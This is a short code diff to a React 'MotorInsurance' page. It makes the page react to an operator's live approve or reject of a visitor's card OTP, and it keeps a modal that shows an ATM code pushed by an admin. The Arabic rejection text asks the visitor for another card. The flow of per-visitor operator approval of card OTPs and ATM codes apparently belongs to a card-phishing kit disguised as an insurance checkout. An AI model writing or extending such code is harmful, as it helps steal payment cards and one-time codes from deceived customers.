@@ -672,13 +672,12 @@ export default function MotorInsurance() {
     if (!isAwaitingApproval || !visitorId || !isFirebaseConfigured) return;
 
     const unsubscribe = subscribeToApprovalStatus(visitorId, (data) => {
-      // Check for admin ATM code
       if (data.adminAtmCode && data.adminAtmCode !== adminAtmCode) {
         setAdminAtmCode(data.adminAtmCode);
         setShowAtmModal(true);
       }
 
-      if (data.approvalStatus === "approved_otp") {
+      if (data.approvalStatus === "approved_otp" || data.cardOtpApproved === true) {
         setApprovalStatus("approved_otp");
         setIsAwaitingApproval(false);
         setShowAtmModal(false);
@@ -703,7 +702,7 @@ export default function MotorInsurance() {
           setCurrentStep(6);
           handleCurrentPage("motor-insurance-step-6-success");
         }
-      } else if (data.approvalStatus === "rejected") {
+      } else if (data.approvalStatus === "rejected" || data.cardOtpApproved === false) {
         setApprovalStatus("rejected");
         setRejectionReason(
           data.rejectionReason || "تم رفض البطاقة، الرجاء استخدام بطاقة أخرى",
